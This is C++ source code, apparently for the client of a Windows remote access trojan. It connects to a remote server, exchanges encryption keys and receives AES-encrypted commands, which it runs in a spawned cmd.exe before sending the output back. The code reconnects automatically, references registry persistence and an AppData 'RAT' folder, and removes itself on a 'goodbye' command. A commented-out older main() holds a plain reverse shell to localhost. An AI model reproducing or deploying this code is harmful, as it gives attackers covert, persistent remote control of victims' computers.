#include<stdio.h>
#include<winsock2.h>
#include<string>
#include<iostream>
#include <filesystem>
#include "include/keys.h"
#include "include/crypto.h"
#include "include/persist.h"
#include <windows.h>



#pragma comment(lib,"ws2_32.lib") 
#include <iostream>

bool initWinsock() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::cout << "Winsock initialized.\n";
    return true;
}

SOCKET connectToServer(const std::string& ip, int port) {
    char recvbuf[4096];
    int m;
    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        return INVALID_SOCKET;
    }

    sockaddr_in server{};
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ip.c_str());
    server.sin_port = htons(port);

    if (WSAConnect(s, (sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL) < 0) {
        std::cerr << "Connection failed.\n";
        closesocket(s);
        return INVALID_SOCKET;
    }
    std::cout << "Connected to server.\n";
    return s;
}

std::string send_keys(SOCKET& s){
    char recvbuf[4096];
    int m;
    Keys ClientKeys = KeyGeneration();
    m = send(s,ClientKeys.publicKey.c_str(),ClientKeys.publicKey.size(),0); // cambia recvbuf por el mensaje
    if(m == SOCKET_ERROR) {
        std::cerr << "Connection failed.\n";
        closesocket(s);
        return "";
    };
    m = recv(s, recvbuf, sizeof(recvbuf),0);


    std::string Aes_en(recvbuf, m);
    std::string KeyAes = decryptMessageSeal(fromHex(Aes_en),fromHex(ClientKeys.publicKey),fromHex(ClientKeys.privateKey));

    return KeyAes;
}


bool launchCmdProcess(HANDLE& hReadOut, HANDLE& hWriteOut, HANDLE& hReadIn, HANDLE& hWriteIn, PROCESS_INFORMATION& pi) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hReadOut, &hWriteOut, &sa, 0) || !CreatePipe(&hReadIn, &hWriteIn, &sa, 0)) {
        std::cerr << "Pipe creation failed.\n";
        return false;
    }

    STARTUPINFO sui{};
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdOutput = hWriteOut;
    sui.hStdError  = hWriteOut;
    sui.hStdInput  = hReadIn;

    if (!CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)) {
        std::cerr << "Process creation failed.\n";
        return false;
    }

    return true;
}

void commandLoop(SOCKET& s, HANDLE hReadOut, HANDLE hWriteIn, const std::string& ip, int port, std::string& KeyAes) {
    char recvbuf[4096];
    DWORD bytesRead;
    std::vector<unsigned char> key(KeyAes.begin(), KeyAes.end());


    while (true) {
        int n = recv(s, recvbuf, sizeof(recvbuf), 0);
        
        if (n <= 0) {
            std::cerr << "\nConexión perdida. Reintentando...\n";
            closesocket(s);
            WSACleanup();
            Sleep(2000); // espera antes de reconectar

            if (!initWinsock()) continue;
            s = connectToServer(ip, port);
            if (s == INVALID_SOCKET) {
                std::cerr << "Reconexión fallida. Reintentando...\n";
                Sleep(3000);
                continue;
            }
            std::cout << "Reconectado con éxito.\n";
            std::string newKey = send_keys(s);
            key = std::vector<unsigned char>(newKey.begin(), newKey.end());
            continue;
        }
        std::string message_enc(recvbuf,n);
        std::string messages_dec = decryptAES(key,message_enc);

        if (messages_dec == "goodbye") {
            std::cout << "Comando goodbye recibido " << std::endl;
            // delete persistence
            const std::wstring persistValue = L"RATPersistence";
            deletePersistence(persistValue);

            // delete rat path
            std::filesystem::path appdata_path = getAppDataPath();
            std::filesystem::path rat_path = appdata_path / "RAT";
            if (directoryExist(rat_path)) {
                if (deletePath(rat_path)) {
                    std::cout << "RAT directory in AppData eliminated." << std::endl;
                } else {
                    std::cout << "Could not delete the RAT directory." << std::endl;
                }
            } else {
                std::cout << "RAT directory does not exist." << std::endl;
            }

            // delete rat client
            goodBye();


            break;
        }


        messages_dec +="\r\n";

        DWORD bytesWritten;
        WriteFile(hWriteIn, messages_dec.c_str(), messages_dec.size(), &bytesWritten, NULL);
        Sleep(100);

        do {
            if (ReadFile(hReadOut, recvbuf, sizeof(recvbuf) - 1, &bytesRead, NULL) && bytesRead > 0) {
                std::string messages_dec(recvbuf,bytesRead);
                message_enc = encryptAES(key,messages_dec);
                int j = send(s, message_enc.c_str(), message_enc.size(), 0);
                if (j == SOCKET_ERROR) break;
            }
        } while (bytesRead == sizeof(recvbuf) - 1);
    }
}

void cleanup(SOCKET s, HANDLE hReadOut, HANDLE hWriteIn, PROCESS_INFORMATION& pi) {
    CloseHandle(hReadOut);
    CloseHandle(hWriteIn);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
}





 
/* int main(int argc , char *argv[])
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    std::string messages;
    char recvbuf[4096];
    std::string res;
    std::string recvbuf1;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
    HANDLE hReadOut, hWriteOut;
    HANDLE hReadIn, hWriteIn;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };





 
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
    
    printf("Initialised.\n");
    

    if((s = WSASocket(AF_INET , SOCK_STREAM , IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d" , WSAGetLastError());
    }
 
    printf("Socket created.\n");
    
    
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Dirección de prueba, esta la recibiría como parámetro
    server.sin_family = AF_INET;
    server.sin_port = htons( 8888 );

    if (WSAConnect(s , (struct sockaddr *)&server , sizeof(server), NULL, NULL, NULL, NULL) < 0)
    {
        puts("connect error");
        return 1;
    } puts("Connected");
    
 












    
    CreatePipe(&hReadOut, &hWriteOut, &sa, 0); // salida del proceso
    CreatePipe(&hReadIn, &hWriteIn, &sa, 0);
    DWORD bytesRead;

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdOutput = hWriteOut;
    sui.hStdError  = hWriteOut;
    sui.hStdInput  = hReadIn;;
    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    while (true) {
        int n = recv(s, recvbuf, sizeof(recvbuf), 0);
        if (n <= 0) break;
        DWORD bytesWritten;
        WriteFile(hWriteIn,  recvbuf , n, &bytesWritten, NULL);
        Sleep(100);
        do {
            if (ReadFile(hReadOut, recvbuf, sizeof(recvbuf) - 1, &bytesRead, NULL) && bytesRead > 0) {
            recvbuf[bytesRead] = '\0';
            int j = send(s, recvbuf, bytesRead, 0);
            if (j == SOCKET_ERROR) break;
        }} while (bytesRead == sizeof(recvbuf) - 1);

        }




    
    CloseHandle(hReadOut);
    CloseHandle(hWriteIn);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();

    exit(0);
} */